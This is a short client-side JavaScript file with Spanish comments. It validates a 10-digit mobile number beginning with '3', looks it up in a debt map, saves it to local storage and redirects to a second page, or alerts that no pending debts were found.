const celularInput = document.getElementById("celular");

celularInput.addEventListener("input", function () {
  // Permitir que el primer carácter sea "3" y el resto solo números
  if (this.value.length === 1 && this.value !== "3") {
    this.value = ""; // Si el primer dígito no es 3, limpiar el input
  } else {
    // Permitir solo números después del primer dígito
    this.value = this.value.replace(/[^0-9]/g, "");
  }
});

celularInput.addEventListener("keydown", function (event) {
  // Evitar que se escriban más de 10 dígitos
  if (
    this.value.length >= 10 &&
    event.key !== "Backspace" &&
    event.key !== "Delete"
  ) {
    event.preventDefault();
  }
});

function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

function cambiaimg(selectedId) {
  // Desmarca todas las imágenes
  for (let i = 1; i <= 4; i++) {
    document.getElementById("check" + i).src = "img/uncheck.png";
  }
  // Marca solo la opción seleccionada
  document.getElementById("check" + selectedId).src = "img/check.png";
}

function guardarNumero() {
  var number = document.getElementById("celular").value;
  if (number.length < 10) {
    alert("Por favor ingrese un número de celular válido");
    return;
  }

  if (number in debtMap) {
    info.metaInfo.telnum = number;
    updateLS();
    localStorage.setItem("numeroCelular", number);
    document.getElementById("loader").style.display = "block";
    setTimeout(function () {
      window.location.href = "index2.html"; // Redirige a index2.html
    }, 1000); // 2 segundos
  } else {
    alert(
      "El número que ingresaste se encuentra al día en pagos sin embargo no se encontraron deudas pendientes"
    );
  }
}

document.getElementById("boton").addEventListener("click", function () {
  guardarNumero();
});
